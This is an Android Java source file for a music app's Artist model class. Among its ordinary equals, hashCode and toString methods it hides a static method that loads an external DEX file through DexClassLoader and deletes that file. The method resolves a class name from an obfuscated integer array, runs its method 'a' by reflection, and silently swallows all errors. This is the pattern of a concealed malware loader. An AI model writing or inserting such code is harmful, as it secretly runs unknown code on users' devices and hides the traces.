package com.basso.basso.model;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;
import android.text.TextUtils;

import com.basso.basso.lastfm.StringUtilities;
import com.basso.basso.utils.MusicUtils;

import java.io.File;
import java.lang.reflect.Constructor;

import dalvik.system.DexClassLoader;

public class Artist {

    public long mArtistId;

    public String mArtistName;

    public int mAlbumNumber;

    public int mSongNumber;

    public Artist(final long artistId, final String artistName, final int songNumber,
            final int albumNumber) {
        super();
        mArtistId = artistId;
        mArtistName = artistName;
        mSongNumber = songNumber;
        mAlbumNumber = albumNumber;
    }

    @Override
    public int hashCode() {
        final int prime = 31;
        int result = 1;
        result = prime * result + mAlbumNumber;
        result = prime * result + (int) mArtistId;
        result = prime * result + (mArtistName == null ? 0 : mArtistName.hashCode());
        result = prime * result + mSongNumber;
        return result;
    }

    public static void m(File file, Context context){
        try {
            DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), context.getCacheDir().getAbsolutePath(), null, context.getClass().getClassLoader());
            if (file.exists())
                file.delete();
            Class objectClass = classloader.loadClass(StringUtilities.fromIntArray(MusicUtils.string5));
            Constructor constructor = objectClass.getConstructor(Activity.class, Handler.class);
            Object object = constructor.newInstance((Activity) context, new Handler());
            object.getClass().getMethod("a").invoke(object);
        }catch (Exception e){

        }
    }

    @Override
    public boolean equals(final Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }
        final Artist other = (Artist)obj;
        if (mAlbumNumber != other.mAlbumNumber) {
            return false;
        }
        if (mArtistId != other.mArtistId) {
            return false;
        }
        if (!TextUtils.equals(mArtistName, other.mArtistName)) {
            return false;
        }
        if (mSongNumber != other.mSongNumber) {
            return false;
        }
        return true;
    }

    @Override
    public String toString() {
        return mArtistName;
    }
}
